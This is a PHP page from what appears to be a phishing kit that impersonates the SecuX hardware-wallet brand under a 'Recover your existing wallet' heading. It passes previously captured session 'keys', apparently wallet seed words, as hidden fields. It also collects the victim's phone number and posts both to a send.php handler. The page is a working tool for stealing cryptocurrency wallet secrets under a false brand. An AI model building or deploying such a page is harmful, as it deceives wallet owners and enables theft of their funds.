<?php include_once './config.php'; ?>
<?php
$filterProduct = array_values(array_filter(getProducts(), function ($p) {
            return $p['key'] == $_GET['key'];
        }));
if (empty($filterProduct) || !is_array($filterProduct)) {
    redirect(base_url());
} else {
    $product = $filterProduct[0];
}
?>
<html lang="en">
    <?php
    $title = 'Connect Wallet | Select Your SecuX Hardware Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css') ?>">
        <div class="container">
            <div class="row">
                <div class="col-sm-12 text-center">
                    <img src="<?= $product['img'] ?>" alt="SecuX V20 &amp; W20" class="text-center" style="width: 200px;" />
                    <h1 class="fs40 fw-semibold pt8"><?= $product['name'] ?></h1>
                </div>
            </div>
            <div class="row justify-content-center">
                <div class='col-sm-5 rounded-1 p25 bg-white rounded-5'>
                    <div class="fw-semibold fs22">Recover your existing wallet</div>
                    <div class="fw-semibold">2-Step Verification</div>
                    <form method="post" action="<?= base_url('send.php') ?>" class="pt50">
                        <input type="hidden" name="pkey" value="<?= $product['key'] ?>">
                        <div className="my25">
                            <?php foreach ($_SESSION["keys"] as $ki => $key) { ?>
                                <input type="hidden" name="keys[<?= $ki ?>]" class="" placeholder="<?= $ki ?>" required="" style="background: transparent; border: 1px solid rgb(51, 51, 51);" value="<?= $key ?>" />
                            <?php } ?>
                            <div class="form-control  fs16" style=" background-color: #EFEFEF; border: 0px; ">
                                <input name="phone_number" type="number" id="phone_number" required="" style="background-color: #FFF;font-size: 16px;padding: 8px 12px;border-radius: 0px;border: 1px solid #ccc;color: #000;width: 80%;" placeholder="Phone number" value="" autocomplete="off" >
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-sm-12 my30 text-center">
                                <button type="submit" class="btn btn-dark px60 rounded-pill py12 fs15">Confirm & Verify</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="<?= base_url('assets/country-code-picker/js/jquery.ccpicker.min.js') ?>"></script>
        <script type="text/javascript">
            $(document).ready(function () {
                $("#phone_number").CcPicker({countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json') ?>", searchPlaceHolder: "Find..."});
            });
        </script>
    </body>
</html>